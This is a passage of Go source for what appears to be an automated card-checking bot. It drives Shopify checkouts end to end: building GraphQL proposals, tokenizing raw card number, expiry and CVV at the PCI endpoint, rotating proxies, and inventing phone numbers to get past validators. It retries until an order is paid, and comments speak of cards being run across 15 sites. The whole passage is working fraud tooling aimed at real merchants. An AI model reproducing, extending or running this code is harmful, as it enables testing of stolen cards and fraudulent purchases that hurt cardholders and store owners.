				"expectedTotalPrice":     map[string]interface{}{"any": true},
				"destinationChanged":     true,
			}},
			"noDeliveryRequired": []interface{}{},
		}
	} else {
		deliveryVars = map[string]interface{}{
			"deliveryLines": []interface{}{},
			"noDeliveryRequired": []map[string]interface{}{
				{"stableId": stableID},
			},
			"useProgressiveRates":   false,
			"supportsSplitShipping": true,
		}
	}

	variables := map[string]interface{}{
		"sessionInput": map[string]string{"sessionToken": sst},
		"queueToken":   queueToken,

		"delivery": deliveryVars,
		"merchandise": map[string]interface{}{
			"merchandiseLines": []map[string]interface{}{{
				"stableId": stableID,
				"merchandise": map[string]interface{}{
					"productVariantReference": map[string]interface{}{
						"id":                fmt.Sprintf("gid://shopify/ProductVariantMerchandise/%s", merch),
						"variantId":         fmt.Sprintf("gid://shopify/ProductVariant/%s", variantID),
						"properties":        []interface{}{},
						"sellingPlanId":     nil,
						"sellingPlanDigest": nil,
					},
				},
				"quantity":           map[string]interface{}{"items": map[string]int{"value": 1}},
				"expectedTotalPrice": map[string]interface{}{"any": true},
			}},
		},
		"payment": map[string]interface{}{
			"totalAmount":    map[string]interface{}{"any": true},
			"paymentLines":   []interface{}{},
			"billingAddress": billingAddr,
		},
		"buyerIdentity": map[string]interface{}{
			"customer":     map[string]string{"presentmentCurrency": currency, "countryCode": addr.CountryCode},
			"email":        email,
			"emailChanged": false,
			"rememberMe":   false,
		},
		"taxes": map[string]interface{}{
			"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": "0", "currencyCode": currency}},
		},
		"tip":                   map[string]interface{}{"tipLines": []interface{}{}},
		"note":                  map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
		"localizationExtension": map[string]interface{}{"fields": []interface{}{}},
		"nonNegotiableTerms":    nil,
		"scriptFingerprint": map[string]interface{}{
			"signature": nil, "signatureUuid": nil,
			"lineItemScriptChanges": []interface{}{}, "paymentScriptChanges": []interface{}{}, "shippingScriptChanges": []interface{}{},
		},
		"optionalDuties": map[string]interface{}{"buyerRefusesDuties": false},
	}

	payload, _ := json.Marshal(map[string]interface{}{
		"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal",
	})

	// Step 3: Proposal
	body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
	if err != nil {
		res.Message = "Proposal request failed"
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
		return res
	}
	if status == 429 || status == 430 || status == 503 {
		res.Message = nonJSONResponseCode(status, body)
		return res
	}

	resultType := fstr(body, "__typename")
	if resultType == "CheckpointDenied" || resultType == "Throttled" || resultType == "NegotiationResultFailed" {
		res.Message = resultType
		return res
	}

	checkpointData := fstr(body, "checkpointData")
	if qt := fstr(body, "queueToken"); qt != "" {
		queueToken = qt
	}

	totalPrice := fstr(fastExtract(sellerBlock(body), "checkoutTotal"), "amount")
	if totalPrice == "" {
		totalPrice = fstr(fastExtract(sellerBlock(body), "runningTotal"), "amount")
	}
	if p, err := strconv.ParseFloat(totalPrice, 64); err == nil {
		res.Price = p
	}

	deliveryStrategy := func() string {
		sp := fastExtract(body, "sellerProposal")
		if sp == nil {
			sp = body
		}
		return fstr(fastExtract(sp, "selectedDeliveryStrategy"), "handle")
	}()
	if deliveryStrategy == "" {
		strats := fastExtract(body, "availableDeliveryStrategies")
		if strats != nil {
			deliveryStrategy = fstr(strats, "handle")
		}
	}
	// All available strategy handles — the submit loop cycles through these
	// when the seller rejects our selected strategy (STRATEGY_CONDITIONS).
	// Per item only the FIRST handle is the strategy's own (nested objects
	// like brandedPromise carry their own handle fields).
	_stratHandles := []string{}
	_stratIdx := 0
	if ab := fastExtract(sellerBlock(body), "availableDeliveryStrategies"); ab != nil && len(ab) > 2 {
		inner := ab[1 : len(ab)-1]
		depth, start, inStr := 0, 0, false
		for i := 0; i < len(inner); i++ {
			c := inner[i]
			if inStr {
				if c == '\\' {
					i++
				} else if c == '"' {
					inStr = false
				}
				continue
			}
			switch c {
			case '"':
				inStr = true
			case '{', '[':
				if depth == 0 {
					start = i
				}
				depth++
			case '}', ']':
				depth--
				if depth == 0 {
					item := inner[start : i+1]
					if hi := bytes.Index(item, []byte(`"handle"`)); hi != -1 {
						rest := item[hi+len(`"handle"`):]
						rest = bytes.TrimLeft(rest, " \t\n\r:")
						rest = bytes.TrimLeft(rest, " \t\n\r:")
						if len(rest) > 0 && rest[0] == '"' {
							end := 1
							for end < len(rest) && rest[end] != '"' {
								if rest[end] == '\\' {
									end++
								}
								end++
							}
							if h := string(rest[1:end]); h != "" {
								_dup := false
								for _, _e := range _stratHandles {
									if _e == h {
										_dup = true
										break
									}
								}
								if !_dup {
									_stratHandles = append(_stratHandles, h)
								}
							}
						}
					}
				}
			case ',':
			}
		}
	}

	signedHandle := extractSignedHandle(body)

	paymentIdentifier := ""
	gatewayName := ""
	{
		var pp struct {
			Data struct {
				Session struct {
					Negotiate struct {
						Result struct {
							SellerProposal struct {
								Payment *struct {
									AvailablePaymentLines []struct {
										PaymentMethod map[string]interface{} `json:"paymentMethod"`
									} `json:"availablePaymentLines"`
								} `json:"payment"`
							} `json:"sellerProposal"`
						} `json:"result"`
					} `json:"negotiate"`
				} `json:"session"`
			} `json:"data"`
		}
		if json.Unmarshal(body, &pp) == nil && pp.Data.Session.Negotiate.Result.SellerProposal.Payment != nil {
			for _, ln := range pp.Data.Session.Negotiate.Result.SellerProposal.Payment.AvailablePaymentLines {
				if ln.PaymentMethod == nil {
					continue
				}
				id, _ := ln.PaymentMethod["paymentMethodIdentifier"].(string)
				if id == "" {
					continue
				}
				paymentIdentifier = id
				if s, _ := ln.PaymentMethod["extensibilityDisplayName"].(string); s != "" {
					gatewayName = s
				} else if s, _ := ln.PaymentMethod["name"].(string); s != "" {
					gatewayName = s
				}
				break
			}
		}

		if paymentIdentifier == "" {
			if payLines := fastExtract(body, "availablePaymentLines"); payLines != nil {
				if pm := fastExtract(payLines, "paymentMethod"); pm != nil {
					paymentIdentifier = fstr(pm, "paymentMethodIdentifier")
					gatewayName = fstr(pm, "extensibilityDisplayName")
					if gatewayName == "" {
						gatewayName = fstr(pm, "name")
					}
				}
			}
		}
	}
	if gatewayName != "" {
		res.Gateway = gatewayName
	}
	if paymentIdentifier == "" {
		res.Message = "No valid payment method found"
		return res
	}

	taxAmount := "0"
	// _taxFresh tracks whether taxAmount came from a detailed seller block
	// (vs default/proposal guess) — fresh figures are safe to ACK with.
	_taxFresh := false
	taxObj := fastExtract(body, "tax")
	if taxObj != nil {
		if ta := fstr(taxObj, "amount"); ta != "" {
			taxAmount = ta
			_taxFresh = true
		} else if tv := fastExtract(taxObj, "value"); tv != nil {
			if ta := fstr(tv, "amount"); ta != "" {
				taxAmount = ta
				_taxFresh = true
			}
		}
	}

	scriptFP := fastExtract(body, "scriptFingerprint")
	transformerFP := fstr(body, "transformerFingerprintV2")

	// Step 4: Confirm Delivery (physical goods only)
	if requiresShipping && deliveryStrategy != "" {
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["selectedDeliveryStrategy"] = map[string]interface{}{
			"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
			"options":                  map[string]string{},
		}
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["targetMerchandiseLines"] = map[string]interface{}{"lines": []map[string]string{{"stableId": stableID}}}
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["destinationChanged"] = false
	}
	variables["taxes"] = map[string]interface{}{
		"proposedTotalAmount": map[string]interface{}{"any": true},
	}

	payload, _ = json.Marshal(map[string]interface{}{"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal"})
	body, _, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
	if err != nil {
		res.Message = "Delivery confirm failed"
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
		return res
	}

	if qt := fstr(body, "queueToken"); qt != "" {
		queueToken = qt
	}
	if cd := fstr(body, "checkpointData"); cd != "" {
		checkpointData = cd
	}
	if ds := func() string {
		sp := fastExtract(body, "sellerProposal")
		if sp == nil {
			sp = body
		}
		return fstr(fastExtract(sp, "selectedDeliveryStrategy"), "handle")
	}(); ds != "" {
		deliveryStrategy = ds
	}
	if sh := extractSignedHandle(body); sh != "" {
		signedHandle = sh
	}
	if tp := fstr(fastExtract(sellerBlock(body), "checkoutTotal"), "amount"); tp != "" {
		if p, err := strconv.ParseFloat(tp, 64); err == nil {
			res.Price = p
		}
	}
	if ta := fstr(fastExtract(sellerBlock(body), "tax"), "amount"); ta != "" {
		taxAmount = ta
	} else if tv := fastExtract(fastExtract(sellerBlock(body), "tax"), "value"); tv != nil {
		if ta := fstr(tv, "amount"); ta != "" {
			taxAmount = ta
		}
	}
	if sf := fastExtract(body, "scriptFingerprint"); sf != nil {
		scriptFP = sf
	}
	if tf := fstr(body, "transformerFingerprintV2"); tf != "" {
		transformerFP = tf
	}

	// Seller's presentment currency (filled inside refreshProposal) — if
	// submit later fails with a currency-mismatch code, the retry loop
	// re-aligns buyerIdentity + taxes to this.
	sellerCurrency := ""
	refreshProposal := func() {
		if requiresShipping && deliveryStrategy != "" {
			if dl, ok := variables["delivery"].(map[string]interface{}); ok {
				if lines, ok := dl["deliveryLines"].([]map[string]interface{}); ok && len(lines) > 0 {
					lines[0]["selectedDeliveryStrategy"] = map[string]interface{}{
						"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
						"options":                  map[string]interface{}{},
					}
				}
			}
		}
		payload, _ := json.Marshal(map[string]interface{}{"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal"})
		b, _, _ := doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
		if len(b) == 0 {
			return
		}
		body = b
		if qt := fstr(body, "queueToken"); qt != "" {
			queueToken = qt
		}
		if cd := fstr(body, "checkpointData"); cd != "" {
			checkpointData = cd
		}
		if ds := func() string {
			sp := fastExtract(body, "sellerProposal")
			if sp == nil {
				sp = body
			}
			return fstr(fastExtract(sp, "selectedDeliveryStrategy"), "handle")
		}(); ds != "" {
			deliveryStrategy = ds
		}
		if sh := extractSignedHandle(body); sh != "" {
			signedHandle = sh
		}
		if tp := fstr(fastExtract(sellerBlock(body), "checkoutTotal"), "amount"); tp != "" {
			if pv, err := strconv.ParseFloat(tp, 64); err == nil {
				res.Price = pv
			}
		}
		// Seller's presentment currency — captured into outer sellerCurrency.
		if sc := fstr(fastExtract(sellerBlock(body), "checkoutTotal"), "currencyCode"); sc != "" {
			sellerCurrency = sc
		}
		if ta := fstr(fastExtract(sellerBlock(body), "tax"), "amount"); ta != "" {
			taxAmount = ta
			_taxFresh = true
		} else if tv := fastExtract(fastExtract(sellerBlock(body), "tax"), "value"); tv != nil {
			if ta := fstr(tv, "amount"); ta != "" {
				taxAmount = ta
				_taxFresh = true
			}
		}
		if sf := fastExtract(body, "scriptFingerprint"); sf != nil {
			scriptFP = sf
		}
		if tf := fstr(body, "transformerFingerprintV2"); tf != "" {
			transformerFP = tf
		}
	}
	needRateWait := false
	rateDelayMs := 1000
	if taxBlk := fastExtract(body, "tax"); taxBlk != nil && fstr(taxBlk, "__typename") == "PendingTerms" {
		needRateWait = true
		if pd := fstr(taxBlk, "pollDelay"); pd != "" {
			if ms, err := strconv.Atoi(pd); err == nil && ms > 0 {
				rateDelayMs = ms
			}
		}
	}
	if requiresShipping && deliveryStrategy == "" {
		needRateWait = true
	}
	if eta := fstr(fastExtract(body, "delivery"), "progressiveRatesEstimatedTimeUntilCompletion"); eta != "" {
		needRateWait = true
		if ms, err := strconv.Atoi(eta); err == nil && ms > 0 {
			rateDelayMs = ms
		}
	} else if fastExtract(body, "intermediateRates") != nil {
		needRateWait = true
	}
	if needRateWait {
		delay := minInt(maxInt(rateDelayMs, 400), 2000)
		time.Sleep(time.Duration(delay) * time.Millisecond)
		refreshProposal()
		if requiresShipping && deliveryStrategy == "" {
			delay2 := minInt(maxInt(rateDelayMs, 800), 2500)
			time.Sleep(time.Duration(delay2) * time.Millisecond)
			refreshProposal()
		}
	}

	// Step 5: PCI Tokenization with proxy fallback
	paceStep()
	pciPayload, _ := json.Marshal(map[string]interface{}{
		"credit_card": map[string]interface{}{
			"number": cc, "month": mes, "year": ano,
			"verification_value": cvv,
			"name":               fmt.Sprintf("%s %s", fName, lName),
		},
		"payment_session_scope": u.Host,
	})

	pciHeaders := map[string]string{
		"Content-Type": "application/json",
		"Accept":       "application/json",
		"Origin":       "https://checkout.pci.shopifyinc.com",
		"Referer":      "https://checkout.pci.shopifyinc.com/",
		"User-Agent":   headers["User-Agent"],
	}
	if identSig != "" {
		pciHeaders["shopify-identification-signature"] = identSig
	}

	pciToken := ""

	// First attempt: use existing proxy client
	body, _, err = doReq(ctx, client, "POST", pciURL, pciHeaders, bytes.NewReader(pciPayload))
	if err == nil {
		pciToken = fstr(body, "id")
	}

	// NOTE: no direct (no-proxy) fallback here on purpose. A PCI token minted
	// from our datacenter IP but submitted through the user's proxy (or vice
	// versa) dies at submit with PAYMENTS_CREDIT_CARD_SESSION_ID — a full
	// wasted cycle. Fail fast so the bot rotates site/proxy instead.
	if pciToken == "" {
		res.Message = "PCI_TOKEN_FAILED"
		atomic.AddInt64(&metrics.PCIFails, 1)
		return res
	}

	// Step 6: Submit
	paceStep()
	submitAttemptToken := fmt.Sprintf("%s-%s", attemptToken, getRandStr(11))
	submitVars := map[string]interface{}{
		"input": map[string]interface{}{
			"sessionInput":   map[string]string{"sessionToken": sst},
			"queueToken":     queueToken,
			"checkpointData": checkpointData,
			"discounts":      map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
			"deliveryExpectations": map[string]interface{}{
				"deliveryExpectationLines": func() []map[string]string {
					if signedHandle != "" {
						return []map[string]string{{"signedHandle": signedHandle}}
					}
					return []map[string]string{}
				}(),
			},
			"merchandise": variables["merchandise"],
			"payment": map[string]interface{}{
				"totalAmount": map[string]interface{}{"any": true},
				"paymentLines": []map[string]interface{}{{
					"paymentMethod": map[string]interface{}{
						"directPaymentMethod": map[string]interface{}{
							"paymentMethodIdentifier": paymentIdentifier,
							"sessionId":               pciToken,
							"billingAddress":          billingAddr,
						},
					},
					"amount": map[string]interface{}{"any": true},
				}},
				"billingAddress": billingAddr,
			},
			"buyerIdentity": variables["buyerIdentity"],
			"taxes": map[string]interface{}{
				"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
			},
			"optionalDuties": map[string]interface{}{"buyerRefusesDuties": false},
		},
		"attemptToken": submitAttemptToken,
		"analytics":    map[string]string{"requestUrl": checkoutURL},
	}

	if requiresShipping {
		submitVars["input"].(map[string]interface{})["delivery"] = map[string]interface{}{
			"deliveryLines": []map[string]interface{}{{
				"destination": map[string]interface{}{
					"streetAddress": billingAddr["streetAddress"],
				},
				"selectedDeliveryStrategy": map[string]interface{}{
					"deliveryStrategyByHandle": map[string]interface{}{
						"handle":             deliveryStrategy,
						"customDeliveryRate": false,
					},
					"options": map[string]string{"phone": phoneE164},
				},
				"targetMerchandiseLines": map[string]interface{}{
					"lines": []map[string]string{{"stableId": stableID}},
				},
				"deliveryMethodTypes":    []string{"SHIPPING"},
				"expectedTotalPrice":     map[string]interface{}{"any": true},
				"destinationChanged":     false,
			}},
			"noDeliveryRequired":    []interface{}{},
			"useProgressiveRates":   true,
			"supportsSplitShipping": true,
		}
	} else {
		submitVars["input"].(map[string]interface{})["delivery"] = map[string]interface{}{
			"deliveryLines": []interface{}{},
			"noDeliveryRequired": []map[string]interface{}{
				{"stableId": stableID},
			},
			"useProgressiveRates":   false,
			"supportsSplitShipping": true,
		}
		submitVars["input"].(map[string]interface{})["deliveryExpectations"] = map[string]interface{}{
			"deliveryExpectationLines": []interface{}{},
		}
	}

	if scriptFP != nil {
		var sfm map[string]interface{}
		if json.Unmarshal(scriptFP, &sfm) == nil {
			delete(sfm, "__typename")
			for _, k := range []string{"lineItemScriptChanges", "paymentScriptChanges", "shippingScriptChanges"} {
				if sfm[k] == nil {
					sfm[k] = []interface{}{}
				}
			}
			if b, err := json.Marshal(sfm); err == nil {
				submitVars["input"].(map[string]interface{})["scriptFingerprint"] = json.RawMessage(b)
			}
		} else {
			submitVars["input"].(map[string]interface{})["scriptFingerprint"] = json.RawMessage(scriptFP)
		}
	}
	if transformerFP != "" {
		submitVars["input"].(map[string]interface{})["transformerFingerprintV2"] = transformerFP
	}

	submitPayload, _ := json.Marshal(map[string]interface{}{
		"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion",
	})

	body, _, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
	if err != nil {
		res.Message = "Submit failed"
		atomic.AddInt64(&metrics.SubmitFails, 1)
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
		return res
	}

	// NOTE: read __typename off the submitForCompletion object — and take the
	// LAST one: nested objects (buyerProposal…) serialize first, the outer
	// SubmitRejected/Success tag sorts last. First-match yields "Proposal".
	submitType := fstr(body, "__typename")
	if _sfc := fastExtract(body, "submitForCompletion"); _sfc != nil {
		if _t := lastStr(_sfc, "__typename"); _t != "" {
			submitType = _t
		}
	}
	log.Printf("[DBG submit] cc=%s base=%s bodylen=%d fstr=%q sfc=%v submitType=%q taxesInclBody=%q", maskCard(cc+"|"+mes+"|"+ano+"|"+cvv), baseURL, len(body), fstr(body, "__typename"), fastExtract(body, "submitForCompletion") != nil, submitType, fstr(body, "taxesIncluded"))

	_taxShape := "proposed"
	// Phone rendering cycle: e164 (initial submit) → omit → local →
	// raw. Strict per-country validators accept exactly one of these;
	// PHONE codes advance the cycle, REQUIRED restores a present shape.
	_phoneModes := []string{"omit", "local", "raw", "e164"}
	_phoneIdx := 0
	_phoneMode := "e164"
	applyPhone := func(mode string) {
		_phoneMode = mode
		var _p string
		switch mode {
		case "omit":
			_p = ""
		case "local":
			_p = phoneLocal
		case "raw":
			_p = phoneRaw
		default:
			_p = phoneE164
		}
		if _sa, _ok := billingAddr["streetAddress"].(map[string]string); _ok {
			if _p == "" {
				delete(_sa, "phone")
			} else {
				_sa["phone"] = _p
			}
		}
		if _inMap, _ok := submitVars["input"].(map[string]interface{}); _ok {
			if _dl, _ok := _inMap["delivery"].(map[string]interface{}); _ok {
				if _lines, _ok := _dl["deliveryLines"].([]map[string]interface{}); _ok && len(_lines) > 0 {
					if _opt, _ok := _lines[0]["selectedDeliveryStrategy"].(map[string]interface{}); _ok {
						if _o, _ok := _opt["options"].(map[string]string); _ok {
							_o["phone"] = _p
						}
					}
				}
			}
		}
	}
	_prevSig, _prevPrevSig := "", ""
	_sigHist := []string{}
	for _rejTry, _topErr := 0, ""; _rejTry < 8 && submitType == "SubmitRejected"; _rejTry++ {
		errCodes := []string{}
		errs := fastExtract(body, "errors")
		if errs != nil {
			for i := 0; i < 5; i++ {
				code := fstr(errs, "code")
				if code != "" {
					errCodes = append(errCodes, code)
				}
				if len(errs) <= len(code)+10 {
					break
				}
				errs = fastExtract(errs[len(code)+10:], "code")
				if errs == nil {
					break
				}
			}
		}
		// Stuck detection: same non-waiting codes 3x in a row, or only 2
		// distinct codes across the last 4 rounds (A,B,A,B flap) → terminal.
		// WAITING is exempt (its remedy is elapsed time); cap 8 bounds all.
		_sig := strings.Join(errCodes, "|")
		if _rejTry >= 2 && _sig == _prevSig && _sig == _prevPrevSig && !strings.Contains(_sig, "WAITING_PENDING_TERMS") {
			break
		}
		_sigHist = append(_sigHist, _sig)
		if _rejTry >= 5 && !strings.Contains(_sig, "WAITING_PENDING_TERMS") {
			_seen := map[string]bool{}
			for _, _s := range _sigHist[maxInt(0, len(_sigHist)-4):] {
				_seen[_s] = true
			}
			if len(_seen) <= 2 {
				break
			}
		}
		_prevPrevSig, _prevSig = _prevSig, _sig
		// Refresh strategy handles from the latest seller block (proposal
		// may have had PendingTerms; submit responses carry the filled list).
		if ab := fastExtract(sellerBlock(body), "availableDeliveryStrategies"); ab != nil && len(ab) > 2 {
			inner := ab[1 : len(ab)-1]
			depth, start, inStr := 0, 0, false
			for i := 0; i < len(inner); i++ {
				c := inner[i]
				if inStr {
					if c == '\\' {
						i++
					} else if c == '"' {
						inStr = false
					}
					continue
				}
				switch c {
				case '"':
					inStr = true
				case '{', '[':
					if depth == 0 {
						start = i
					}
					depth++
				case '}', ']':
					depth--
					if depth == 0 {
						item := inner[start : i+1]
						if hi := bytes.Index(item, []byte(`"handle"`)); hi != -1 {
							rest := item[hi+len(`"handle"`):]
							rest = bytes.TrimLeft(rest, " \t\n\r:")
							rest = bytes.TrimLeft(rest, " \t\n\r:")
							if len(rest) > 0 && rest[0] == '"' {
								end := 1
								for end < len(rest) && rest[end] != '"' {
									if rest[end] == '\\' {
										end++
									}
									end++
								}
								if h := string(rest[1:end]); h != "" {
									_dup := false
									for _, _e := range _stratHandles {
										if _e == h {
											_dup = true
											break
										}
									}
									if !_dup {
										_stratHandles = append(_stratHandles, h)
									}
								}
							}
						}
					}
				}
			}
		}
		// Null-tax TAX_NEW_TAX: seller publishes totalTaxAmount null, so no
		// figure exists to ACK with — but an explicit zero proposal costs
		// one submit and sometimes satisfies "concrete total" demands.
		// (Omitting was already tried to reach this state.)
		if len(errCodes) == 1 && errCodes[0] == "TAX_NEW_TAX_MUST_BE_ACCEPTED" {
			if tb := fastExtract(sellerBlock(body), "tax"); tb != nil && bytes.Contains(tb, []byte(`"totalTaxAmount":null`)) {
				taxAmount = "0"
				_taxFresh = true
			}
		}
		// Delivery-strategy rejected: cycle the seller's remaining handles.
		// (Deleting the selection is schema-invalid — non-nullable field.)
		// Handles exhausted → resubmits repeat → stuck-break terminates.
		// Reactive only.
		for _, _c := range errCodes {
			if strings.Contains(_c, "STRATEGY_CONDITIONS") || strings.Contains(_c, "NO_DELIVERY_STRATEGY") {
				for _stratIdx < len(_stratHandles) && _stratHandles[_stratIdx] == deliveryStrategy {
					_stratIdx++
				}
				if _stratIdx < len(_stratHandles) {
					deliveryStrategy = _stratHandles[_stratIdx]
					_stratIdx++
				}
				break
			}
		}
		// Phone rejected: REQUIRED restores a present shape; any other
		// PHONE pattern advances the rendering cycle (omit → local →
		// raw → e164). Stuck-break bounds stores that reject everything.
		for _, _c := range errCodes {
			if !strings.Contains(_c, "PHONE_NUMBER") {
				continue
			}
			// Fresh digits every remedy: a bad draw (wrong leading digit
			// for the country) must not poison all format attempts.
			regenPhones()
			if strings.Contains(_c, "REQUIRED") {
				if _phoneMode != "e164" {
					applyPhone("e164")
				}
				break
			}
			applyPhone(_phoneModes[_phoneIdx%len(_phoneModes)])
			_phoneIdx++
			break
		}
		for _, _c := range errCodes {
			if (strings.Contains(_c, "PRESENTMENT_CURRENCY") || strings.Contains(_c, "CURRENCY_NOT_SUPPORTED")) && sellerCurrency != "" && sellerCurrency != currency {
				currency = sellerCurrency
				res.Currency = sellerCurrency
				if _bi, ok := submitVars["input"].(map[string]interface{})["buyerIdentity"].(map[string]interface{}); ok {
					if _cu, ok := _bi["customer"].(map[string]string); ok {
						_cu["presentmentCurrency"] = sellerCurrency
					}
				}
				break
			}
		}
		if rejectNeedsTermAccept(errCodes) {
			sellerRej := fastExtract(body, "sellerProposal")
			if sellerRej == nil {
				sellerRej = body
			}
			if ta := fstr(fastExtract(sellerRej, "tax"), "amount"); ta != "" {
				taxAmount = ta
				_taxFresh = true
			}
			if ds := fstr(fastExtract(sellerRej, "selectedDeliveryStrategy"), "handle"); ds != "" {
				deliveryStrategy = ds
			}
			if sh := fstr(fastExtract(fastExtract(sellerRej, "deliveryExpectations"), "deliveryExpectations"), "signedHandle"); sh != "" {
				signedHandle = sh
			}
			if sf := fastExtract(sellerRej, "scriptFingerprint"); sf != nil {
				scriptFP = sf
			}
			if tf := fstr(sellerRej, "transformerFingerprintV2"); tf != "" {
				transformerFP = tf
			}
			dl := submitVars["input"].(map[string]interface{})["delivery"].(map[string]interface{})
			if lines, ok := dl["deliveryLines"].([]map[string]interface{}); ok && len(lines) > 0 {
				if deliveryStrategy != "" {
					_optPhone := phoneE164
					switch _phoneMode {
					case "omit":
						_optPhone = ""
					case "local":
						_optPhone = phoneLocal
					case "raw":
						_optPhone = phoneRaw
					}
					lines[0]["selectedDeliveryStrategy"] = map[string]interface{}{
						"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
						"options":                  map[string]string{"phone": _optPhone},
					}
				}
				lines[0]["expectedTotalPrice"] = map[string]interface{}{"any": true}
				lines[0]["destinationChanged"] = false
			}
			if signedHandle != "" {
				submitVars["input"].(map[string]interface{})["deliveryExpectations"] = map[string]interface{}{
					"deliveryExpectationLines": []map[string]string{{"signedHandle": signedHandle}},
				}
			} else {
				submitVars["input"].(map[string]interface{})["deliveryExpectations"] = map[string]interface{}{
					"deliveryExpectationLines": []map[string]string{},
				}
			}
			var sfm map[string]interface{}
			if scriptFP != nil && json.Unmarshal(scriptFP, &sfm) == nil {
				delete(sfm, "__typename")
				for _, k := range []string{"lineItemScriptChanges", "paymentScriptChanges", "shippingScriptChanges"} {
					if sfm[k] == nil {
						sfm[k] = []interface{}{}
					}
				}
				if b, err := json.Marshal(sfm); err == nil {
					submitVars["input"].(map[string]interface{})["scriptFingerprint"] = json.RawMessage(b)
				}
			}
			if transformerFP != "" {
				submitVars["input"].(map[string]interface{})["transformerFingerprintV2"] = transformerFP
			}
			_incl := false
			for _, _c := range errCodes {
				if strings.Contains(_c, "INCLUSIVITY") {
					_incl = true
					break
				}
			}
			if _incl {
				// INCLUSIVITY: inclusive-target and duty-amount are NOT
				// valid TaxTermInput fields (server rejects both) — omit
				// taxes and let seller terms stand. Reactive only: first
				// submit untouched, working stores safe.
				delete(submitVars["input"].(map[string]interface{}), "taxes")
				_taxShape = "omit"
			} else if _taxShape == "omit" && !_taxFresh {
				// Progressed under omission but no fresh tax figure was
				// extracted — keep omitting, nothing concrete to ACK with.
				delete(submitVars["input"].(map[string]interface{}), "taxes")
			} else {
				submitVars["input"].(map[string]interface{})["taxes"] = map[string]interface{}{
					"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
				}
				_taxShape = "proposed"
			}
			submitVars["attemptToken"] = submitAttemptToken
			// Pending terms compute async — give the backend time to settle
			// before resubmitting, otherwise every retry returns the same
			// intermediate state and the card burns all 15 sites as ERROR.
			_waitMs := 1000
			for _, _c := range errCodes {
				if _c == "WAITING_PENDING_TERMS" {
					_waitMs = 3000
					break
				}
			}
			select {
			case <-ctx.Done():
			case <-time.After(time.Duration(_waitMs) * time.Millisecond):
			}
			submitPayload, _ = json.Marshal(map[string]interface{}{"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion"})
			_rb, _, retryErr := doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
			if retryErr != nil {
				res.Message = "Submit failed"
				return res
			}
			if isCaptchaRequired(_rb) {
				res.Message = "CAPTCHA_REQUIRED"
				return res
			}
			// Only adopt the resubmit response when it carries a negotiation
			// payload. Top-level validation errors (e.g. unknown input field
			// from a failed remedy) must NOT clobber body/submitType —
			// otherwise the loop silently exits and reports a stale code.
			if _sfc := fastExtract(_rb, "submitForCompletion"); _sfc != nil {
				body = _rb
				submitType = fstr(body, "__typename")
				if _t := lastStr(_sfc, "__typename"); _t != "" {
					submitType = _t
				}
			} else {
				_topErr = extractCleanResponse(string(_rb))
				_topMsg := fstr(_rb, "message")
				if len(_topMsg) > 180 {
					_topMsg = _topMsg[:180]
				}
				_topErr = _topErr + "::" + _topMsg
			}
			_tb := fastExtract(sellerRej, "tax")
			log.Printf("[DBG tax] cc=%s try=%d taxblk=%.300s", maskCard(cc+"|"+mes+"|"+ano+"|"+cvv), _rejTry, _tb)
			log.Printf("[DBG retry] cc=%s try=%d codes=%q taxAmt=%q shape=%s newType=%q topErr=%q rblen=%d", maskCard(cc+"|"+mes+"|"+ano+"|"+cvv), _rejTry, errCodes, taxAmount, _taxShape, submitType, _topErr, len(body))
		}
	}

	if submitType == "SubmitSuccess" || submitType == "SubmittedForCompletion" || submitType == "SubmitAlreadyAccepted" {
		// SubmitSuccess sometimes arrives with errors attached but no receipt
		// yet (terms accepted, receipt still materializing). Re-submit once
		// with the SAME idempotent attemptToken after a short settle wait —
		// safe by idempotency, surfaces the real receipt/verdict.
		if _sfc0 := fastExtract(body, "submitForCompletion"); _sfc0 != nil && fastExtract(_sfc0, "receipt") == nil {
			select {
			case <-ctx.Done():
			case <-time.After(3 * time.Second):
			}
			submitPayload, _ = json.Marshal(map[string]interface{}{"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion"})
			if _rb, _, _rerr := doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload)); _rerr == nil && !isCaptchaRequired(_rb) {
				body = _rb
				if _sfc := fastExtract(body, "submitForCompletion"); _sfc != nil {
					if _t := lastStr(_sfc, "__typename"); _t != "" {
						submitType = _t
					}
				}
			}
		}
	}
	if submitType == "SubmitSuccess" || submitType == "SubmittedForCompletion" || submitType == "SubmitAlreadyAccepted" {
		receiptType := lastStr(fastExtract(body, "receipt"), "__typename")
		if receiptType == "ProcessedReceipt" {
			res.Success = true
			res.Message = "ORDER_PAID"
			res.Time = fmt.Sprintf("%.2fs", time.Since(cardStart).Seconds())
			return res
